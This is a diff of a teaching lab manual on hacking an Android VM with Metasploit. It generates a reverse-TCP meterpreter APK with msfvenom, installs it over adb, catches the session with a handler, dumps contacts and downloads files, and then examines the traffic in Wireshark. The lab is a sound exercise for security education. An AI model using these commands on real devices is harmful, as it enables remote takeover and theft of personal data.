@@ -2,109 +2,119 @@
 
 ## Set-up
 
-Set up two VMs, keep the attacker and victim machine within the same subnet.
+
+````{note}
+In this lab, we need to set up two VMs: an attacker (Ubuntu 20.04) and a victim (Android 7.1.1), please make sure they are using the **same subnet**. On the attacker, all environments are pre-built in the Docker container: [yangzhou301/lab7:latest](https://hub.docker.com/r/yangzhou301/lab7), in which `/root/volume` is the shared folder between the host Ubuntu and the container. You should keep the output `tcp_reverse.apk` that is generated in this lab on your host VM for the further usage in Lab 6.
+````
 
 `````{tabbed} Attacker: Ubuntu
 
-IP address: `10.0.2.15`
+IP address: `10.9.0.6`
 
-
-Install [Metasploit](https://www.metasploit.com/) Module
-
-
-```sh
-$ sudo apt install python3-dev
-$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
-$ chmod 755 msfinstall
-$ ./msfinstall
+```{tip}
+`10.9.0.6` is just an **example** in this manual, you have to determine your actual IP address by `ifconfig` command.
 ```
 
-Install `adb` to send `.apk` files to the android VM
+Pull the Docker image for this lab
 
 ```
-$ sudo apt install adb
+$ docker pull yangzhou301/lab6
 ```
 
-Install [WireShark](https://www.wireshark.org/) to capture the traffic between two machines:
+Open the folder for this lab and check if `volume` folder in it:
 
 ```
-$ sudo add-apt-repository ppa:wireshark-dev/stable
-$ sudo apt-get install wireshark
+$ cd $HOME/lab7
+# volume
 ```
+
+Start the container using the shared `volume` and network with the host:
+
+```
+$ docker run --rm -it --network host -v $HOME/lab7/volume:/root/volume yangzhou301/lab7
+```
+
+It brings you to the `/bin/bash` at `/root` directory of the container.
 
 `````
 
 `````{tabbed} Victim: Android
-IP address: `10.0.2.11`
+IP address: `10.9.0.5`
 
-Run an Android virtual machine as [what seed project requests to do](https://seedsecuritylabs.org/Labs_16.04/Mobile/). After the VM installed, add some entries in `Contacts` app (e.g. Name: KMR, Phone: 114-514-1919)
-
-````{note}
-The IP address of the Android VM can be obtained by running `Terminal Emulator` app and typing
-
+```{tip}
+`10.9.0.5` is just an **example** in this manual, you have to determine your actual IP address by `ifconfig` command after launching Terminal Emulator app.
 ```
-$ ifconfig
-```
+Run the Android VM.
 
-````
 `````
 
-````{note}
-The two IP addresses listed above are just examples, you need to replace the values with the actual IP addresses on your virtual machines by
+## Explore Metasploit
 
-```
-$ ifconfig
-```
+[Metasploit](https://docs.rapid7.com/metasploit/) is a powerful Android penetration testing framework, which can be used to create some simple android malwares.
 
-in the following tasks.
-
-Please make sure that the two VMs are configured with the same subnet.
-````
-
-
-## Explore Metasploits 
+First, we search all modules in Metasploit to find out those modules for Android exploits.
 
 ```
 $ msfconsole
 msf >  search type:payload platform:android
 ```
 
-Create a reversed TCP [^ex]
+We can see numerous exploits in Metasploit for hacking Android listed in the outputs. In this lab, we select the most commonly known and stable payload, "reversed TCP", to perform the hacking, which established TCP connection between the attacker and the victim and the attacker can get a reversed shell to control it. 
+
+Create a reverse-TCP payload[^ex] `apk`
 
 ```
 msf > msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.6 LPORT=4444 -f raw -o volume/reverse_tcp.apk
 ```
 
-Start a handler:
+We can check `volume` (both on host and container) to see if it constructs successfully:
+
+```
+msf > ls volume
+```
+
+Then, send the generated `reverse_tcp.apk` to the vicitm Android VM and install it:
+
+```
+msf > adb connect 10.9.0.5
+msf > adb install volume/reverse_tcp.apk
+# disconnect to avoid noise in traffic monitor
+msf > adb disconnect
+```
+
+````{warning}
+If `adb` connect fails, please use `ifconfig` to check if the victim and the attacker share the same subnet. If they are, but `adb` reports error as "No route to host", and when you `ping` each other it gives the error message "Destination Network / Host unreachable", maybe some network interface created by other containers before occupies the ip address of gateway/router `10.9.0.1`, run
+
+```
+$ docker network prune
+```
+
+to remove them and retry `adb connect` command above.
+````
+
+Start a handler to listen on port 4444 of the attacker VM:
 
 ```
 msf > use exploit/multi/handler
 msf > set payload android/meterpreter/reverse_tcp
-msf > set lhost 10.0.2.15
+msf > set lhost 10.9.0.6
 msf > set lport 4444
 msf > exploit
 ```
 
-Send the `reverse_tcp.apk` to the vicitm machine and install it:
-
-```
-$ adb connect 10.0.2.11
-$ adb install reverse_tcp.apk
-```
-
 From the victim Android, we start the installed app `MainActivity`
 
-![](victim.png)
+![](main-activity.png)
 
 ```{warning}
-No obvious response after double-clicking, but actually it is running in the backgroud.
+No obvious response after double-clicking, but actually it is running in the background.
 ```
 
 Then we can see the session information from the attacker VM:
 
 ![Connected successfully](session.png)
 
-Press <kbd>Enter</kbd> and go into the `meterpreter` console.
+Now, we get the `meterpreter` console.
 
 ### Basic Commands
 
@@ -125,13 +135,15 @@ Dump all contacts
 
 ```
 meterpreter > dump_contacts
-[*] Fetching 3 contacts into list
-[*] Contacts list saved to: contacts_dump_20210527000741.txt
+[*] Fetching 5 contacts into list
+[*] Contacts list saved to: contacts_dump_20210729033039.txt
 ```
 
-Let's check it:
+If you want to view the dumped contacts information, exit `meterpreter` by `exit` and use `cat` to check:
 
 ![Dump all contacts information from the victim Android](contacts.png)
+
+Then run `sessions -i 1` to restore the session.
 
 ````{seealso}
 More commands can be found by:
@@ -166,18 +178,13 @@ meterpreter > download /etc/hosts
 
 ## Monitor Traffic
 
-Launch `Wireshark` with root privilege:
+Launch `Wireshark` from desktop home bar.
 
-```
-$ sudo wireshark
-```
 
-When starting an `exploit` in [Explore Metasploits](#explore-metasploits), `Wireshark` captures the TCP traffic between the attacker and the victim. For example, here are the packets that the reversed TCP connection establishes (Note that `10.0.2.15:4444` is the malicious host):
+When starting an `exploit` in [Explore Metasploits](#explore-metasploits), `Wireshark` captures the TCP traffic between the attacker and the victim. For example, here are the packets that the TCP connection establishes and transfers some encoded data(Note that `10.9.0.6:4444` is the malicious host):
 
 ![](./establish.png)
 
-We dump the captured traffic into an `.pcap` file, which can be opened with `wireshark`. for example:
-
-{download}`sample.pcap`
-
-which records all network traffic during the attack, try to distinguish which traffics are related to the attack process.
+```{important}
+Don't delete the `reverse_tcp.apk` created in this lab, we will use it in the following labs.
+```
